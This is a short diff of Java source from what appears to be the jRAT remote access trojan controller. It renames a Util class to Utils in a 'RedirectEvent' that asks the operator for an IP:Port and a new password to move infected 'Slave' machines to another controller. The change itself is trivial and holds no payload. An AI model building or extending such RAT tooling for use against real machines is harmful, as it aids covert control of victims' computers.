@@ -5,7 +5,7 @@ import javax.swing.ImageIcon;
 import pro.jrat.Slave;
 import pro.jrat.packets.outgoing.Packet75Redirect;
 import pro.jrat.utils.IconUtils;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 public class RedirectEvent extends Event {
@@ -36,12 +36,12 @@ public class RedirectEvent extends Event {
 
 	@Override
 	public boolean add() {
-		String result = Util.showDialog("Redirect", "Input IP:Port to redirect to");
+		String result = Utils.showDialog("Redirect", "Input IP:Port to redirect to");
 		if (result == null) {
 			return false;
 		}
 
-		String result1 = Util.showDialog("Redirect", "Input new password");
+		String result1 = Utils.showDialog("Redirect", "Input new password");
 		if (result1 == null) {
 			return false;
 		}
